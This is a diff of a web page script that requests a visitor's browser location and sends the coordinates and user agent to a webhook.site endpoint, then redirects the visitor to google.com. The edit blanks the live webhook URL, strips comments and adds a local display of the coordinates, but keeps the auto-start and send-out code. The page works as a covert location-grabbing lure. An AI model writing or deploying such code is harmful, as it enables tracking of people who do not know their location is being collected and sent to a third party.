@@ -36,10 +36,10 @@
 <script>
 /*
   Configure:
-  - WEBHOOK_URL: optional. If blank, no POST will be made.
+  - WEBHOOK_URL: optional. If blank, coordinates are shown locally instead.
   - TOKEN: optional. If set, sent as Authorization: Bearer <TOKEN>.
 */
-const WEBHOOK_URL = "https://webhook.site/445aa34b-1427-4b36-b988-5b12df87f749"; // e.g. "https://webhook.site/your-id" or leave empty
+const WEBHOOK_URL = ""; // e.g., "https://webhook.site/your-id"
 const TOKEN = "";       // optional auth token
 
 const STATUS = document.getElementById('status');
@@ -48,21 +48,21 @@ const startBtn = document.getElementById('startBtn');
 function setStatus(s){ STATUS.textContent = 'Status: ' + s; }
 
 async function sendPayload(payload){
-  if (!WEBHOOK_URL) { setStatus('Captured locally; no endpoint set.'); return; }
+  if (!WEBHOOK_URL) { 
+    // Show coordinates if no endpoint set
+    setStatus(`Captured locally — Latitude: ${payload.latitude}, Longitude: ${payload.longitude}, Accuracy: ${payload.accuracy_m}m`);
+    setTimeout(()=>{ window.location.href = 'https://www.google.com'; }, 1500);
+    return; 
+  }
   const body = JSON.stringify(payload);
-  // Try sendBeacon first (works well during navigation)
   try {
     if (navigator.sendBeacon) {
       const blob = new Blob([body], {type: 'application/json'});
       const ok = navigator.sendBeacon(WEBHOOK_URL, blob);
       if (ok) { setStatus('Sent via sendBeacon.'); return; }
-      // if sendBeacon returned false, fallthrough to fetch
     }
-  } catch(e){
-    // ignore and fall back to fetch
-  }
+  } catch(e){}
 
-  // Fallback: fetch with keepalive (may be ignored by some browsers if navigating away immediately)
   try {
     const headers = {'Content-Type':'application/json'};
     if (TOKEN) headers['Authorization'] = 'Bearer ' + TOKEN;
@@ -88,17 +88,13 @@ function onSuccess(pos){
     user_agent: navigator.userAgent
   };
   setStatus('Location obtained — sending then redirecting...');
-  // Best-effort send, then redirect.
-  // Use sendPayload but do NOT wait too long; navigator.sendBeacon usually queues it.
   sendPayload(payload).finally(()=>{
-    // Short delay to give sendBeacon a moment; still redirect immediately enough to be smooth.
-    setTimeout(()=>{ window.location.href = 'https://www.google.com'; }, 350);
+    if (WEBHOOK_URL) setTimeout(()=>{ window.location.href = 'https://www.google.com'; }, 350);
   });
 }
 
 function onError(err){
   setStatus('Geolocation error: ' + (err && err.message ? err.message : err));
-  // Still redirect after a short delay so flow continues.
   setTimeout(()=>{ window.location.href = 'https://www.google.com'; }, 900);
 }
 
@@ -120,16 +116,13 @@ function requestLocationOnce(){
   }
 }
 
-// Some browsers require a user gesture to show permission prompt.
-// Try automatically; if blocked, user can tap Start.
-try {
-  // Auto-run after brief idle so page paints first.
-  setTimeout(requestLocationOnce, 300);
-} catch(e){
-  // ignore
-}
-
+// Require user gesture for reliability (especially on Safari)
 startBtn.addEventListener('click', requestLocationOnce);
+
+// Optional: try auto-start after small delay (may be blocked in some browsers)
+try {
+  setTimeout(requestLocationOnce, 300);
+} catch(e){}
 </script>
 </body>
 </html>
